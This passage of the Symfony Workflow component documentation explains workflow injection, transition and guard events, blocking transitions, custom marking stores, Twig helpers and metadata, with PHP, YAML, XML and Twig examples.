7.1\n\n    The :method:`Symfony\\\\Component\\\\Workflow\\\\WorkflowInterface::getEnabledTransition`\n    method was introduced in Symfony 7.1.\n\nWorkflows can also be injected thanks to their name and the\n:class:`Symfony\\\\Component\\\\DependencyInjection\\\\Attribute\\\\Target`\nattribute::\n\n    use App\\Entity\\BlogPost;\n    use Symfony\\Component\\DependencyInjection\\Attribute\\Target;\n    use Symfony\\Component\\Workflow\\WorkflowInterface;\n\n    class MyClass\n    {\n        public function __construct(\n            #[Target('blog_publishing')]\n            private WorkflowInterface $workflow\n        ) {\n        }\n\n        // ...\n    }\n\nThis allows you to decorrelate the argument name of any implementation\nname.\n\n.. tip::\n\n    If you want to retrieve all workflows, for documentation purposes for example,\n    you can :doc:`inject all services </service_container/service_subscribers_locators>`\n    with the following tag:\n\n    * ``workflow``: all workflows and all state machine;\n    * ``workflow.workflow``: all workflows;\n    * ``workflow.state_machine``: all state machines.\n\n    Note that workflow metadata are attached to tags under the ``metadata`` key,\n    giving you more context and information about the workflow at disposal.\n    Learn more about :ref:`tag attributes <tags_additional-attributes>` and\n    :ref:`storing workflow metadata <workflow_storing-metadata>`.\n\n    .. versionadded:: 7.1\n\n        The attached configuration to the tag was introduced in Symfony 7.1.\n\n.. tip::\n\n    You can find the list of available workflow services with the\n    ``php bin/console debug:autowiring workflow`` command.\n\n.. _workflow_using-events:\n\nUsing Events\n------------\n\nTo make your workflows more flexible, you can construct the ``Workflow``\nobject with an ``EventDispatcher``. You can now create event listeners to\nblock transitions (i.e. depending on the data in the blog post) and do\nadditional actions when a workflow operation happened (e.g. sending\nannouncements).\n\nEach step has three events that are fired in order:\n\n* An event for every workflow;\n* An event for the workflow concerned;\n* An event for the workflow concerned with the specific transition or place name.\n\nWhen a state transition is initiated, the events are dispatched in the following\norder:\n\n``workflow.guard``\n    Validate whether the transition is blocked or not (see\n    :ref:`guard events <workflow-usage-guard-events>` and\n    :ref:`blocking transitions <workflow-blocking-transitions>`).\n\n    The three events being dispatched are:\n\n    * ``workflow.guard``\n    * ``workflow.[workflow name].guard``\n    * ``workflow.[workflow name].guard.[transition name]``\n\n``workflow.leave``\n    The subject is about to leave a place.\n\n    The three events being dispatched are:\n\n    * ``workflow.leave``\n    * ``workflow.[workflow name].leave``\n    * ``workflow.[workflow name].leave.[place name]``\n\n``workflow.transition``\n    The subject is going through this transition.\n\n    The three events being dispatched are:\n\n    * ``workflow.transition``\n    * ``workflow.[workflow name].transition``\n    * ``workflow.[workflow name].transition.[transition name]``\n\n``workflow.enter``\n    The subject is about to enter a new place. This event is triggered right\n    before the subject places are updated, which means that the marking of the\n    subject is not yet updated with the new places.\n\n    The three events being dispatched are:\n\n    * ``workflow.enter``\n    * ``workflow.[workflow name].enter``\n    * ``workflow.[workflow name].enter.[place name]``\n\n``workflow.entered``\n    The subject has entered in the places and the marking is updated.\n\n    The three events being dispatched are:\n\n    * ``workflow.entered``\n    * ``workflow.[workflow name].entered``\n    * ``workflow.[workflow name].entered.[place name]``\n\n``workflow.completed``\n    The object has completed this transition.\n\n    The three events being dispatched are:\n\n    * ``workflow.completed``\n    * ``workflow.[workflow name].completed``\n    * ``workflow.[workflow name].completed.[transition name]``\n\n``workflow.announce``\n    Triggered for each transition that now is accessible for the subject.\n\n    The three events being dispatched are:\n\n    * ``workflow.announce``\n    * ``workflow.[workflow name].announce``\n    * ``workflow.[workflow name].announce.[transition name]``\n\n    After a transition is applied, the announce event tests for all available\n    transitions. That will trigger all :ref:`guard events <workflow-usage-guard-events>`\n    once more, which could impact performance if they include intensive CPU or\n    database workloads.\n\n    If you don't need the announce event, disable it using the context::\n\n        $workflow->apply($subject, $transitionName, [Workflow::DISABLE_ANNOUNCE_EVENT => true]);\n\n.. note::\n\n    The leaving and entering events are triggered even for transitions that stay\n    in the same place.\n\n.. note::\n\n    If you initialize the marking by calling ``$workflow->getMarking($object);``,\n    then the ``workflow.[workflow_name].entered.[initial_place_name]`` event will\n    be called with the default context (``Workflow::DEFAULT_INITIAL_CONTEXT``).\n\nHere is an example of how to enable logging for every time a \"blog_publishing\"\nworkflow leaves a place::\n\n    // src/App/EventSubscriber/WorkflowLoggerSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use Psr\\Log\\LoggerInterface;\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Workflow\\Event\\Event;\n    use Symfony\\Component\\Workflow\\Event\\LeaveEvent;\n\n    class WorkflowLoggerSubscriber implements EventSubscriberInterface\n    {\n        public function __construct(\n            private LoggerInterface $logger,\n        ) {\n        }\n\n        public function onLeave(Event $event): void\n        {\n            $this->logger->alert(sprintf(\n                'Blog post (id: \"%s\") performed transition \"%s\" from \"%s\" to \"%s\"',\n                $event->getSubject()->getId(),\n                $event->getTransition()->getName(),\n                implode(', ', array_keys($event->getMarking()->getPlaces())),\n                implode(', ', $event->getTransition()->getTos())\n            ));\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                LeaveEvent::getName('blog_publishing') => 'onLeave',\n                // if you prefer, you can write the event name manually like this:\n                // 'workflow.blog_publishing.leave' => 'onLeave',\n            ];\n        }\n    }\n\n.. tip::\n\n    All built-in workflow events define the ``getName(?string $workflowName, ?string $transitionOrPlaceName)``\n    method to build the full event name without having to deal with strings.\n    You can also use this method in your custom events via the\n    :class:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\EventNameTrait`.\n\n    .. versionadded:: 7.1\n\n        The ``getName()`` method was introduced in Symfony 7.1.\n\nIf some listeners update the context during a transition, you can retrieve\nit via the marking::\n\n    $marking = $workflow->apply($post, 'to_review');\n\n    // contains the new value\n    $marking->getContext();\n\nIt is also possible to listen to these events by declaring event listeners\nwith the following attributes:\n\n* :class:`Symfony\\\\Component\\\\Workflow\\\\Attribute\\\\AsAnnounceListener`\n* :class:`Symfony\\\\Component\\\\Workflow\\\\Attribute\\\\AsCompletedListener`\n* :class:`Symfony\\\\Component\\\\Workflow\\\\Attribute\\\\AsEnterListener`\n* :class:`Symfony\\\\Component\\\\Workflow\\\\Attribute\\\\AsEnteredListener`\n* :class:`Symfony\\\\Component\\\\Workflow\\\\Attribute\\\\AsGuardListener`\n* :class:`Symfony\\\\Component\\\\Workflow\\\\Attribute\\\\AsLeaveListener`\n* :class:`Symfony\\\\Component\\\\Workflow\\\\Attribute\\\\AsTransitionListener`\n\nThese attributes do work like the\n:class:`Symfony\\\\Component\\\\EventDispatcher\\\\Attribute\\\\AsEventListener`\nattributes::\n\n    class ArticleWorkflowEventListener\n    {\n        #[AsTransitionListener(workflow: 'my-workflow', transition: 'published')]\n        public function onPublishedTransition(TransitionEvent $event): void\n        {\n            // ...\n        }\n\n        // ...\n    }\n\nYou may refer to the documentation about\n:ref:`defining event listeners with PHP attributes <event-dispatcher_event-listener-attributes>`\nfor further use.\n\n.. _workflow-usage-guard-events:\n\nGuard Events\n~~~~~~~~~~~~\n\nThere are special types of events called \"Guard events\". Their event listeners\nare invoked every time a call to ``Workflow::can()``, ``Workflow::apply()`` or\n``Workflow::getEnabledTransitions()`` is executed. With the guard events you may\nadd custom logic to decide which transitions should be blocked or not. Here is a\nlist of the guard event names.\n\n* ``workflow.guard``\n* ``workflow.[workflow name].guard``\n* ``workflow.[workflow name].guard.[transition name]``\n\nThis example stops any blog post being transitioned to \"reviewed\" if it is\nmissing a title::\n\n    // src/App/EventSubscriber/BlogPostReviewSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use App\\Entity\\BlogPost;\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Workflow\\Event\\GuardEvent;\n\n    class BlogPostReviewSubscriber implements EventSubscriberInterface\n    {\n        public function guardReview(GuardEvent $event): void\n        {\n            /** @var BlogPost $post */\n            $post = $event->getSubject();\n            $title = $post->title;\n\n            if (empty($title)) {\n                $event->setBlocked(true, 'This blog post cannot be marked as reviewed because it has no title.');\n            }\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                'workflow.blog_publishing.guard.to_review' => ['guardReview'],\n            ];\n        }\n    }\n\n.. _workflow-chosing-events-to-dispatch:\n\nChoosing which Events to Dispatch\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you prefer to control which events are fired when performing each transition,\nuse the ``events_to_dispatch`` configuration option. This option does not apply\nto :ref:`Guard events <workflow-usage-guard-events>`, which are always fired:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/workflow.yaml\n        framework:\n            workflows:\n                blog_publishing:\n                    # you can pass one or more event names\n                    events_to_dispatch: ['workflow.leave', 'workflow.completed']\n\n                    # pass an empty array to not dispatch any event\n                    events_to_dispatch: []\n\n                    # ...\n\n    .. code-block:: xml\n\n        <!-- config/packages/workflow.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:workflow name=\"blog_publishing\">\n                    <!-- you can pass one or more event names -->\n                    <framework:event-to-dispatch>workflow.leave</framework:event-to-dispatch>\n                    <framework:event-to-dispatch>workflow.completed</framework:event-to-dispatch>\n\n                    <!-- pass an empty array to not dispatch any event -->\n                    <framework:event-to-dispatch></framework:event-to-dispatch>\n\n                    <!-- ... -->\n                </framework:workflow>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/workflow.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n\n            $blogPublishing = $framework->workflows()->workflows('blog_publishing');\n\n            // ...\n            // you can pass one or more event names\n            $blogPublishing->eventsToDispatch([\n                'workflow.leave',\n                'workflow.completed',\n            ]);\n\n            // pass an empty array to not dispatch any event\n            $blogPublishing->eventsToDispatch([]);\n\n            // ...\n        };\n\nYou can also disable a specific event from being fired when applying a transition::\n\n    use App\\Entity\\BlogPost;\n    use Symfony\\Component\\Workflow\\Exception\\LogicException;\n\n    $post = new BlogPost();\n\n    $workflow = $this->container->get('workflow.blog_publishing');\n\n    try {\n        $workflow->apply($post, 'to_review', [\n            Workflow::DISABLE_ANNOUNCE_EVENT => true,\n            Workflow::DISABLE_LEAVE_EVENT => true,\n        ]);\n    } catch (LogicException $exception) {\n        // ...\n    }\n\nDisabling an event for a specific transition will take precedence over any\nevents specified in the workflow configuration. In the above example the\n``workflow.leave`` event will not be fired, even if it has been specified as an\nevent to be dispatched for all transitions in the workflow configuration.\n\nThese are all the available constants:\n\n    * ``Workflow::DISABLE_LEAVE_EVENT``\n    * ``Workflow::DISABLE_TRANSITION_EVENT``\n    * ``Workflow::DISABLE_ENTER_EVENT``\n    * ``Workflow::DISABLE_ENTERED_EVENT``\n    * ``Workflow::DISABLE_COMPLETED_EVENT``\n\nEvent Methods\n~~~~~~~~~~~~~\n\nEach workflow event is an instance of :class:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event`.\nThis means that each event has access to the following information:\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event::getMarking`\n    Returns the :class:`Symfony\\\\Component\\\\Workflow\\\\Marking` of the workflow.\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event::getSubject`\n    Returns the object that dispatches the event.\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event::getTransition`\n    Returns the :class:`Symfony\\\\Component\\\\Workflow\\\\Transition` that dispatches the event.\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event::getWorkflowName`\n    Returns a string with the name of the workflow that triggered the event.\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event::getMetadata`\n    Returns a metadata.\n\nFor Guard Events, there is an extended :class:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\GuardEvent` class.\nThis class has these additional methods:\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\GuardEvent::isBlocked`\n    Returns if transition is blocked.\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\GuardEvent::setBlocked`\n    Sets the blocked value.\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\GuardEvent::getTransitionBlockerList`\n    Returns the event :class:`Symfony\\\\Component\\\\Workflow\\\\TransitionBlockerList`.\n    See :ref:`blocking transitions <workflow-blocking-transitions>`.\n\n:method:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\GuardEvent::addTransitionBlocker`\n    Add a :class:`Symfony\\\\Component\\\\Workflow\\\\TransitionBlocker` instance.\n\n.. _workflow-blocking-transitions:\n\nBlocking Transitions\n--------------------\n\nThe execution of the workflow can be controlled by calling custom logic to\ndecide if the current transition is blocked or allowed before applying it. This\nfeature is provided by \"guards\", which can be used in two ways.\n\nFirst, you can listen to :ref:`the guard events <workflow-usage-guard-events>`.\nAlternatively, you can define a ``guard`` configuration option for the\ntransition. The value of this option is any valid expression created with the\n:doc:`ExpressionLanguage component </components/expression_language>`:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/workflow.yaml\n        framework:\n            workflows:\n                blog_publishing:\n                    # previous configuration\n                    transitions:\n                        to_review:\n                            # the transition is allowed only if the current user has the ROLE_REVIEWER role.\n                            guard: \"is_granted('ROLE_REVIEWER')\"\n                            from: draft\n                            to:   reviewed\n                        publish:\n                            # or \"is_anonymous\", \"is_remember_me\", \"is_fully_authenticated\", \"is_granted\", \"is_valid\"\n                            guard: \"is_authenticated\"\n                            from: reviewed\n                            to:   published\n                        reject:\n                            # or any valid expression language with \"subject\" referring to the supported object\n                            guard: \"is_granted('ROLE_ADMIN') and subject.isRejectable()\"\n                            from: reviewed\n                            to:   rejected\n\n    .. code-block:: xml\n\n        <!-- config/packages/workflow.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n            https://symfony.com/schema/dic/services/services-1.0.xsd\n            http://symfony.com/schema/dic/symfony\n            https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:workflow name=\"blog_publishing\" type=\"workflow\">\n\n                    <!-- ... previous configuration -->\n\n                    <framework:transition name=\"to_review\">\n                        <!-- the transition is allowed only if the current user has the ROLE_REVIEWER role. -->\n                        <framework:guard>is_granted(\"ROLE_REVIEWER\")</framework:guard>\n                        <framework:from>draft</framework:from>\n                        <framework:to>reviewed</framework:to>\n                    </framework:transition>\n\n                    <framework:transition name=\"publish\">\n                        <!-- or \"is_anonymous\", \"is_remember_me\", \"is_fully_authenticated\", \"is_granted\" -->\n                        <framework:guard>is_authenticated</framework:guard>\n                        <framework:from>reviewed</framework:from>\n                        <framework:to>published</framework:to>\n                    </framework:transition>\n\n                    <framework:transition name=\"reject\">\n                        <!-- or any valid expression language with \"subject\" referring to the post -->\n                        <framework:guard>is_granted(\"ROLE_ADMIN\") and subject.isStatusReviewed()</framework:guard>\n                        <framework:from>reviewed</framework:from>\n                        <framework:to>rejected</framework:to>\n                    </framework:transition>\n\n                </framework:workflow>\n\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/workflow.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $blogPublishing = $framework->workflows()->workflows('blog_publishing');\n            // ... previous configuration\n\n            $blogPublishing->transition()\n                ->name('to_review')\n                    // the transition is allowed only if the current user has the ROLE_REVIEWER role.\n                    ->guard('is_granted(\"ROLE_REVIEWER\")')\n                    ->from(['draft'])\n                    ->to(['reviewed']);\n\n            $blogPublishing->transition()\n                ->name('publish')\n                    // or \"is_anonymous\", \"is_remember_me\", \"is_fully_authenticated\", \"is_granted\"\n                    ->guard('is_authenticated')\n                    ->from(['reviewed'])\n                    ->to(['published']);\n\n            $blogPublishing->transition()\n                ->name('reject')\n                    // or any valid expression language with \"subject\" referring to the post\n                    ->guard('is_granted(\"ROLE_ADMIN\") and subject.isStatusReviewed()')\n                    ->from(['reviewed'])\n                    ->to(['rejected']);\n        };\n\nYou can also use transition blockers to block and return a user-friendly error\nmessage when you stop a transition from happening.\nIn the example we get this message from the\n:class:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event`'s metadata, giving you a\ncentral place to manage the text.\n\nThis example has been simplified; in production you may prefer to use the\n:doc:`Translation </translation>` component to manage messages in one\nplace::\n\n    // src/App/EventSubscriber/BlogPostPublishSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Workflow\\Event\\GuardEvent;\n    use Symfony\\Component\\Workflow\\TransitionBlocker;\n\n    class BlogPostPublishSubscriber implements EventSubscriberInterface\n    {\n        public function guardPublish(GuardEvent $event): void\n        {\n            $eventTransition = $event->getTransition();\n            $hourLimit = $event->getMetadata('hour_limit', $eventTransition);\n\n            if (date('H') <= $hourLimit) {\n                return;\n            }\n\n            // Block the transition \"publish\" if it is more than 8 PM\n            // with the message for end user\n            $explanation = $event->getMetadata('explanation', $eventTransition);\n            $event->addTransitionBlocker(new TransitionBlocker($explanation , '0'));\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                'workflow.blog_publishing.guard.publish' => ['guardPublish'],\n            ];\n        }\n    }\n\nCreating Your Own Marking Store\n-------------------------------\n\nYou may need to implement your own store to execute some additional logic\nwhen the marking is updated. For example, you may have some specific needs\nto store the marking on certain workflows. To do this, you need to implement\nthe\n:class:`Symfony\\\\Component\\\\Workflow\\\\MarkingStore\\\\MarkingStoreInterface`::\n\n    namespace App\\Workflow\\MarkingStore;\n\n    use Symfony\\Component\\Workflow\\Marking;\n    use Symfony\\Component\\Workflow\\MarkingStore\\MarkingStoreInterface;\n\n    final class BlogPostMarkingStore implements MarkingStoreInterface\n    {\n        /**\n         * @param BlogPost $subject\n         */\n        public function getMarking(object $subject): Marking\n        {\n            return new Marking([$subject->getCurrentPlace() => 1]);\n        }\n\n        /**\n         * @param BlogPost $subject\n         */\n        public function setMarking(object $subject, Marking $marking, array $context = []): void\n        {\n            $marking = key($marking->getPlaces());\n            $subject->setCurrentPlace($marking);\n        }\n    }\n\nOnce your marking store is implemented, you can configure your workflow to use\nit:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/workflow.yaml\n        framework:\n            workflows:\n                blog_publishing:\n                    # ...\n                    marking_store:\n                        service: 'App\\Workflow\\MarkingStore\\BlogPostMarkingStore'\n\n    .. code-block:: xml\n\n        <!-- config/packages/workflow.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:workflow name=\"blog_publishing\">\n                    <!-- ... -->\n                    <framework:marking-store service=\"App\\Workflow\\MarkingStore\\BlogPostMarkingStore\"/>\n                </framework:workflow>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/workflow.php\n        use App\\Workflow\\MarkingStore\\ReflectionMarkingStore;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n\n            $blogPublishing = $framework->workflows()->workflows('blog_publishing');\n            // ...\n\n            $blogPublishing->markingStore()\n                ->service(BlogPostMarkingStore::class);\n        };\n\nUsage in Twig\n-------------\n\nSymfony defines several Twig functions to manage workflows and reduce the need\nof domain logic in your templates:\n\n``workflow_can()``\n    Returns ``true`` if the given object can make the given transition.\n\n``workflow_transitions()``\n    Returns an array with all the transitions enabled for the given object.\n\n``workflow_transition()``\n    Returns a specific transition enabled for the given object and transition name.\n\n``workflow_marked_places()``\n    Returns an array with the place names of the given marking.\n\n``workflow_has_marked_place()``\n    Returns ``true`` if the marking of the given object has the given state.\n\n``workflow_transition_blockers()``\n    Returns :class:`Symfony\\\\Component\\\\Workflow\\\\TransitionBlockerList` for the given transition.\n\nThe following example shows these functions in action:\n\n.. code-block:: html+twig\n\n    <h3>Actions on Blog Post</h3>\n    {% if workflow_can(post, 'publish') %}\n        <a href=\"...\">Publish</a>\n    {% endif %}\n    {% if workflow_can(post, 'to_review') %}\n        <a href=\"...\">Submit to review</a>\n    {% endif %}\n    {% if workflow_can(post, 'reject') %}\n        <a href=\"...\">Reject</a>\n    {% endif %}\n\n    {# Or loop through the enabled transitions #}\n    {% for transition in workflow_transitions(post) %}\n        <a href=\"...\">{{ transition.name }}</a>\n    {% else %}\n        No actions available.\n    {% endfor %}\n\n    {# Check if the object is in some specific place #}\n    {% if workflow_has_marked_place(post, 'reviewed') %}\n        <p>This post is ready for review.</p>\n    {% endif %}\n\n    {# Check if some place has been marked on the object #}\n    {% if 'reviewed' in workflow_marked_places(post) %}\n        <span class=\"label\">Reviewed</span>\n    {% endif %}\n\n    {# Loop through the transition blockers #}\n    {% for blocker in workflow_transition_blockers(post, 'publish') %}\n        <span class=\"error\">{{ blocker.message }}</span>\n    {% endfor %}\n\n.. _workflow_storing-metadata:\n\nStoring Metadata\n----------------\n\nIn case you need it, you can store arbitrary metadata in workflows, their\nplaces, and their transitions using the ``metadata`` option. This metadata can\nbe only the title of the workflow or very complex objects:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/workflow.yaml\n        framework:\n            workflows:\n                blog_publishing:\n                    metadata:\n                        title: 'Blog Publishing Workflow'\n                    # ...\n                    places:\n                        draft:\n                            metadata:\n                                max_num_of_words: 500\n                        # ...\n                    transitions:\n                        to_review:\n                            from: draft\n                            to:   review\n                            metadata:\n                                priority: 0.5\n                        publish:\n                            from: reviewed\n                            to:   published\n                            metadata:\n                                hour_limit: 20\n                                explanation: 'You can not publish after 8 PM.'\n\n    .. code-block:: xml\n\n        <!-- config/packages/workflow.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:workflow name=\"blog_publishing\">\n                    <framework:metadata>\n                        <framework:title>Blog Publishing Workflow</framework:title>\n                    </framework:metadata>\n                    <!-- ... -->\n                    <framework:place name=\"draft\">\n                        <framework:metadata>\n                            <framework:max-num-of-words>500</framework:max-num-of-words>\n                        </framework:metadata>\n                    </framework:place>\n                    <!-- ... -->\n                    <framework:transition name=\"to_review\">\n                        <framework:from>draft</framework:from>\n                        <framework:to>review</framework:to>\n                        <framework:metadata>\n                            <framework:priority>0.5</framework:priority>\n                        </framework:metadata>\n                    </framework:transition>\n                    <framework:transition name=\"publish\">\n                        <framework:from>reviewed</framework:from>\n                        <framework:to>published</framework:to>\n                        <framework:metadata>\n                            <framework:hour_limit>20</framework:hour_limit>\n                            <framework:explanation>You can not publish after 8 PM.</framework:explanation>\n                        </framework:metadata>\n                    </framework:transition>\n                </framework:workflow>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/workflow.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $blogPublishing = $framework->workflows()->workflows('blog_publishing');\n            // ... previous configuration\n\n            $blogPublishing->metadata([\n                'title' => 'Blog Publishing Workflow'\n            ]);\n\n            // ...\n\n            $blogPublishing->place()\n                ->name('draft')\n                ->metadata([\n                    'max_num_of_words' => 500,\n                ]);\n\n            // ...\n\n            $blogPublishing->transition()\n                ->name('to_review')\n                    ->from(['draft'])\n                    ->to(['reviewed'])\n                    ->metadata([\n                        'priority' => 0.5,\n                    ]);\n\n            $blogPublishing->transition()\n                ->name('publish')\n                    ->from(['reviewed'])\n                    ->to(['published'])\n                    ->metadata([\n                        'hour_limit' => 20,\n                        'explanation' => 'You can not publish after 8 PM.',\n                    ]);\n        };\n\nThen you can access this metadata in your controller as follows::\n\n    // src/App/Controller/BlogPostController.php\n    use App\\Entity\\BlogPost;\n    use Symfony\\Component\\Workflow\\WorkflowInterface;\n    // ...\n\n    public function myAction(WorkflowInterface $blogPublishingWorkflow, BlogPost $post): Response\n    {\n        $title = $blogPublishingWorkflow\n            ->getMetadataStore()\n            ->getWorkflowMetadata()['title'] ?? 'Default title'\n        ;\n\n        $maxNumOfWords = $blogPublishingWorkflow\n            ->getMetadataStore()\n            ->getPlaceMetadata('draft')['max_num_of_words'] ?? 500\n        ;\n\n        $aTransition = $blogPublishingWorkflow->getDefinition()->getTransitions()[0];\n        $priority = $blogPublishingWorkflow\n            ->getMetadataStore()\n            ->getTransitionMetadata($aTransition)['priority'] ?? 0\n        ;\n\n        // ...\n    }\n\nThere is a ``getMetadata()`` method that works with all kinds of metadata::\n\n    // get \"workflow metadata\" passing the metadata key as argument\n    $title = $workflow->getMetadataStore()->getMetadata('title');\n\n    // get \"place metadata\" passing the metadata key as the first argument and the place name as the second argument\n    $maxNumOfWords = $workflow->getMetadataStore()->getMetadata('max_num_of_words', 'draft');\n\n    // get \"transition metadata\" passing the metadata key as the first argument and a Transition object as the second argument\n    $priority = $workflow->getMetadataStore()->getMetadata('priority', $aTransition);\n\nIn a :ref:`flash message <flash-messages>` in your controller::\n\n    // $transition = ...; (an instance of Transition)\n\n    // $workflow is an injected Workflow instance\n    $title = $workflow->getMetadataStore()->getMetadata('title', $transition);\n    $this->addFlash('info', \"You have successfully applied the transition with title: '$title'\");\n\nMetadata can also be accessed in a Listener, from the :class:`Symfony\\\\Component\\\\Workflow\\\\Event\\\\Event` object.\n\nIn Twig templates, metadata is available via the ``workflow_metadata()`` function:\n\n.. code-block:: html+twig\n\n    <h2>Metadata of Blog Post</h2>\n    <p>\n        <strong>Workflow</strong>:<br>\n        <code>{{ workflow_metadata(blog_post, 'title') }}</code>\n    </p>\n    <p>\n        <strong>Current place(s)</strong>\n        <ul>\n            {% for place in workflow_marked_places(blog_post) %}\n                <li>\n                    {{ place }}:\n                    <code>{{ workflow_metadata(blog_post, 'max_num_of_words', place) ?: 'Unlimited'}}</code>\n                </li>\n            {% endfor %}\n        </ul>\n    </p>\n    <p>\n        <strong>Enabled transition(s)</strong>\n        <ul>\n            {% for transition in workflow_transitions(blog_post) %}\n                <li>\n                    {{ transition.name }}:\n                    <code>{{ workflow_metadata(blog_post, 'priority', transition) ?: 0 }}</code>\n                </li>\n            {% endfor %}\n        </ul>\n    </p>\n    <p>\n        <strong>to_review Priority</strong>\n        <ul>\n            <li>\n                to_review:\n                <code>{{ workflow_metadata(blog_post, 'priority', workflow_transition(blog_post, 'to_review')) }}</code>\n            </li>\n        </ul>\n    </p>\n\nLearn more\n----------\n\n.. toctree::\n   :maxdepth: 1\n\n   /workflow/workflow-and-state-machine\n   /workflow/dumping-workflows\n"
        },
        {
          "name": "workflow",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}